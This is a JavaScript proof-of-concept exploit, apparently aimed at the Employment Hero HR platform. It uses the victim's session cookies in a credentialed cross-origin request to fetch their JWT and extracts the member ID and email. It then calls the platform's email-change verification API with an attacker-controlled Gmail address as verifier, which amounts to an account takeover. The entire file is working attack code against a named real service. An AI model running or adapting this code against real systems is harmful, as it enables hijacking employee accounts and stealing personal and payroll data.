
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
        console.log(this.responseText)
        extractMemberInfo(this.responseText)
        }
    };
    xhr.open("POST","https://secure.employmenthero.com/auth", true);
    xhr.withCredentials = true;
    xhr.send();
    
function extractMemberInfo(jwt) {
    // Split the JWT to get the payload (2nd part)
    const parts = jwt.split('.');
    const header = parts[0];
    const payload = parts[1];
    const signature = parts[2];

    // Save the full JWT (header.payload.signature)
    const jwt_complete = `${header}.${payload}.${signature}`;
    // Decode Base64 (add padding if needed)
    const base64 = payload.replace(/-/g, '+').replace(/_/g, '/');
    const padded = base64 + '='.repeat((4 - base64.length % 4) % 4);
    console.log(base64)
    // Decode and parse JSON
    const json = JSON.parse(atob(padded));

    // Extract values
    const memberId = json.member?.member_id;
    const email = json.member?.email;

    change_email(memberId, email, jwt); // now includes jwt_complete

    return { memberId, email, jwt_complete };
}


function extractTokenFromResponse(responseText) {
    try {
        const data = JSON.parse(responseText);
        return data.token || null;
    } catch (error) {
        console.error("Invalid JSON:", error);
        return null;
    }
}


function change_email(member_id,email,jwt_full){
  jwt_com=extractTokenFromResponse(jwt_full)
    fetch("https://account-verification.ehrocks.com/api/v1/self_email_change/verifications", {
  method: "POST",
  mode: "cors",
  credentials: "include", // to send cookies
  headers: {
    "Accept": "application/json",
    "Accept-Language": "en-AU",
    "Content-Type": "application/json",
    "Jwt-Token": jwt_com, // replace "idk" with actual token
    "X-True-Referrer": "https://secure.employmenthero.com/app/v2/organisations/*/employee_files/*",
    "Origin": "https://secure.employmenthero.com",
    "Referer": "https://secure.employmenthero.com/"
  },
  body: JSON.stringify({
    reviewers: [{ email: "x" }],
    verifier: { email: "poc4mrxx+yougothacked@gmail.com" },
    data: {
      member_id: member_id,
      old_user_email: email
    }
  })
})
.then(response => response.json())
.then(data => console.log(data))
.catch(error => console.error("Error:", error));

}
